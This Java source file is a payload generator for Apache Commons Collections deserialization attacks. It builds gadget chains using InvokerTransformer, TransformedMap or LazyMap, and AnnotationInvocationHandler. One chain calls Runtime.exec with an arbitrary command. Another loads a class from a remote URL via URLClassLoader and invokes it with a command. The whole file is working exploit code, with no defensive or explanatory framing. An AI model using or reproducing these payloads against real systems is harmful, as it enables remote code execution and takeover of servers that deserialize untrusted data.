package payload;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.net.MalformedURLException;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

public class PayloadGeneration {
	
	public static Object generateExecPayload(String cmd) throws Exception
	{
		
		return getPayloadObject(getExecTransformer(cmd));
		
	}
	
	public static Object generateURLClassLoaderPayload(String url, String classNmae, String method, String cmd ) throws Exception
	{
		
		return getPayloadObject(getURLClassLoaderTransformer(url, classNmae, method, cmd));
		
	}
	
	public static Object generateLazyMapExecPayload(String cmd) throws Exception
	{
		return getLazyMapPayloadObject(getExecTransformer(cmd));
	}
	
	public static Object generateLazyMapURLClassLoaderPayload(String url, String classNmae, String method, String cmd ) throws Exception
	{
		return getLazyMapPayloadObject(getURLClassLoaderTransformer(url, classNmae, method, cmd));
	}
	
	private static Object getPayloadObject(Transformer transformerChain) throws Exception 
	{

	    Map innerMap = new HashMap();
	    innerMap.put("value", "value");
	  
	    Map outmap = TransformedMap.decorate(innerMap, null, transformerChain);
	    Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
	    
	    Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class });
	    ctor.setAccessible(true);
	    Object instance = ctor.newInstance(new Object[] { Retention.class, outmap });
	    return instance;
	    
	}
	
	private static Object getLazyMapPayloadObject(Transformer transformerChain) throws Exception 
	{
		Map innerMap = new HashMap();
	    Map lazyMap  = LazyMap.decorate(innerMap, transformerChain);
	    
	  //this will generate a AnnotationInvocationHandler(Override.class,lazymap) invocationhandler
		InvocationHandler invo = (InvocationHandler) getFirstCtor(
				"sun.reflect.annotation.AnnotationInvocationHandler")
				.newInstance(Retention.class, lazyMap);
		
		//generate object which implements specifiy interface 
		
		//use invo to proxy the map interface, when readObject ===> invoke mapProxy.xxx method ===>  
		// invo.invoke()  ===> lazyMap.get(xxx)  ===>  factory.transform
		
		Map mapProxy = Map.class.cast(Proxy.newProxyInstance(PayloadGeneration.class
				.getClassLoader(), new Class[] { Map.class }, invo));
		
		InvocationHandler handler = (InvocationHandler) getFirstCtor(
				"sun.reflect.annotation.AnnotationInvocationHandler")
				.newInstance(Retention.class, mapProxy);
		
	    return handler;
	}
	
	private static Constructor<?> getFirstCtor(final String name)
			throws Exception {
		final Constructor<?> ctor = Class.forName(name)
				.getDeclaredConstructors()[0];
		ctor.setAccessible(true);
		return ctor;
	}
	
	private static Transformer getExecTransformer(String cmd)
	{
		Transformer[] transformers = new Transformer[] {
		        new ConstantTransformer(Runtime.class),
		        new InvokerTransformer("getMethod",      //方法名
		        		new Class[] {String.class, Class[].class },  //参数类型
		        		new Object[] {"getRuntime", new Class[0] }), //参数值
		        new InvokerTransformer("invoke", 
		        		new Class[] {Object.class, Object[].class }, 
		        		new Object[] {null, new Object[0] }),
		        new InvokerTransformer("exec",
		        		new Class[] {String.class },
		        		new Object[] {cmd})
	 		};
		
		Transformer transformerChain = new ChainedTransformer(transformers);
		
		return transformerChain;
		
	}
	
	private static Transformer getURLClassLoaderTransformer(String url, String className, String method, String cmd ) throws MalformedURLException
	{
		// String url = "http://*****/java/";
				// String className = "exploit.ErrorBaseExec";
				//String cmd = "ls";
				//String method = "do_exec";
				
				Transformer[] transformers = new Transformer[] {
						new ConstantTransformer(java.net.URLClassLoader.class),
						new InvokerTransformer(
								"getConstructor",
								new Class[] {Class[].class},
								new Object[] {new Class[]{java.net.URL[].class}}
								),
						new InvokerTransformer(
								"newInstance",
								new Class[] {Object[].class},
								new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(url) }}}
								),
						new InvokerTransformer(
								"loadClass",
								new Class[] { String.class },
								new Object[] { className }
								),
						new InvokerTransformer(
								"getMethod",
								new Class[]{String.class, Class[].class},
								new Object[]{method, new Class[]{String.class}}
								),
						new InvokerTransformer(
								"invoke",
								new Class[]{Object.class, Object[].class},
								new Object[]{null, new String[]{cmd}}
								)
				};
				
				
			/*
				URLClassLoader.class.getConstructor(java.net.URL[].class).newInstance(new java.net.URL("url"))
						.loadClass("remote_class").getMethod("do_exec", String.class).invoke(null, "cmd");

			*/
				
				Transformer transformerChain = new ChainedTransformer(transformers);
				return transformerChain;
				
	}

}
